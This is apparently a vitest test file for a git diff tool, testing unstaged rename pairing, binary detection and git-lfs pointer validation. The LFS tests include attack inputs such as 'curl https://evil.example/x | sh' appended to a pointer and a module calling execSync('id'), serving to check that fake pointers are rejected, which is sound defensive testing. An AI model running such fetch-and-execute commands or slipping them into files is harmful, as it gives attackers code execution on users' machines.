// Shared core for both tools: unstaged rename pairing (src/core/renames.ts) and what a side holds (src/core/hunks.ts).
import { describe, expect, it, vi } from 'vitest';
import { isBinary, isLfsChange, isLfsPointer } from '../../src/core/hunks.ts';
import { pairUnstagedRenames, RENAME_PAIRING } from '../../src/core/renames.ts';
import { contentSimilarity } from '../../src/core/similarity.ts';

// Counted: the quadratic comparison runs only for pairs the prefilter can't rule out.
vi.mock('../../src/core/similarity.ts', async (load) => {
  const real = await load<typeof import('../../src/core/similarity.ts')>();
  return { ...real, contentSimilarity: vi.fn(real.contentSimilarity) };
});

const enc = (t: string) => new TextEncoder().encode(t);
const body = (tag: string, n = 20) => enc(Array.from({ length: n }, (_, i) => `${tag} line ${i}`).join('\n') + '\n');

describe('pairUnstagedRenames', () => {
  it('pairs by content, best first, each file at most once', () => {
    const d = [{ path: 'a.ts' }, { path: 'b.ts' }];
    const a = [{ path: 'x.ts' }, { path: 'y.ts' }];
    const old = new Map([['a.ts', body('a')], ['b.ts', body('b')]]);
    const nu = new Map([['x.ts', body('b')], ['y.ts', body('a')]]);
    const pairs = pairUnstagedRenames(d, a, (x) => old.get(x.path), (x) => nu.get(x.path));
    expect(pairs.map((p) => [p.deleted.path, p.added.path]).sort()).toEqual([['a.ts', 'y.ts'], ['b.ts', 'x.ts']]);
  });

  it('leaves dissimilar files, files over 1 MB and lists over 50 unpaired', () => {
    expect(pairUnstagedRenames([{ path: 'a' }], [{ path: 'b' }], () => body('a'), () => enc('completely\nunrelated\ncontent\n'))).toEqual([]);
    const big = new Uint8Array(RENAME_PAIRING.maxBytes + 1).fill(0x61);
    expect(pairUnstagedRenames([{ path: 'a' }], [{ path: 'b' }], () => big, () => big)).toEqual([]);
    const many = Array.from({ length: RENAME_PAIRING.maxEach + 1 }, (_, i) => ({ path: `d${i}` }));
    expect(pairUnstagedRenames(many, [{ path: 'b' }], () => body('a'), () => body('a'))).toEqual([]);
  });

  it('skips the quadratic comparison for large files that share too few lines to pair', () => {
    const d = Array.from({ length: 4 }, (_, i) => ({ path: `d${i}`, b: body(`old${i}`, 5000) }));
    const a = Array.from({ length: 4 }, (_, i) => ({ path: `a${i}`, b: body(`new${i}`, 5000) }));
    // A moved copy with a third of its lines changed still pairs (similarity ≈ 0.67).
    const moved = enc(new TextDecoder().decode(d[2]!.b).split('\n').map((l, i) => (i % 3 ? l : `${l} edited`)).join('\n'));
    a.push({ path: 'moved', b: moved });
    vi.mocked(contentSimilarity).mockClear();
    const pairs = pairUnstagedRenames(d, a, (x) => x.b, (x) => x.b);
    expect(vi.mocked(contentSimilarity)).toHaveBeenCalledTimes(1); // of 20 pairs, only d2 and the moved copy
    expect(pairs.map((p) => [p.deleted.path, p.added.path])).toEqual([['d2', 'moved']]);
  });
});

describe('what a side holds', () => {
  it('binary: a NUL in the first 8,000 bytes, as git decides', () => {
    expect(isBinary(new Uint8Array([1, 0, 2]))).toBe(true);
    const late = new Uint8Array(9000).fill(0x61);
    late[8500] = 0;
    expect(isBinary(late)).toBe(false);
    expect(isBinary(undefined)).toBe(false);
  });

  const OID = 'a'.repeat(64);
  const pointer = `version https://git-lfs.github.com/spec/v1\noid sha256:${OID}\nsize 12345\n`;

  it('LFS pointer: the complete git-lfs pointer and nothing else', () => {
    expect(isLfsPointer(enc(pointer))).toBe(true);
    expect(isLfsPointer(enc(`version https://git-lfs.github.com/spec/v1\next-0-foo sha256:${'b'.repeat(64)}\noid sha256:${OID}\nsize 0\n`))).toBe(true);
    // The reproduced attack: the version line, then a script.
    expect(isLfsPointer(enc('version https://git-lfs.github.com/spec/v1\ncurl https://evil.example/x | sh\n'))).toBe(false);
    expect(isLfsPointer(enc(`${pointer}curl https://evil.example/x | sh\n`))).toBe(false);
    expect(isLfsPointer(enc(pointer.replace(OID, 'abc')))).toBe(false); // short oid
    expect(isLfsPointer(enc(pointer.replace(/\n$/, '')))).toBe(false); // last line unterminated
    expect(isLfsPointer(enc(pointer.replace(/\n/g, '\r\n')))).toBe(false);
    expect(isLfsPointer(enc(`size 1\n${pointer}`))).toBe(false);
    expect(isLfsPointer(enc('version https://git-lfs.github.com/spec/v2\n'))).toBe(false);
  });

  it('a change is LFS only when every side it has is a pointer', () => {
    const p = enc(pointer);
    const js = enc('module.exports = () => require("child_process").execSync("id");\n');
    expect(isLfsChange(p, p)).toBe(true);
    expect(isLfsChange(undefined, p)).toBe(true); // added
    expect(isLfsChange(p, undefined)).toBe(true); // deleted
    // The reproduced attack: a pointer replaced by arbitrary code.
    expect(isLfsChange(p, js)).toBe(false);
    expect(isLfsChange(js, p)).toBe(false);
    expect(isLfsChange(undefined, undefined)).toBe(false);
  });
});
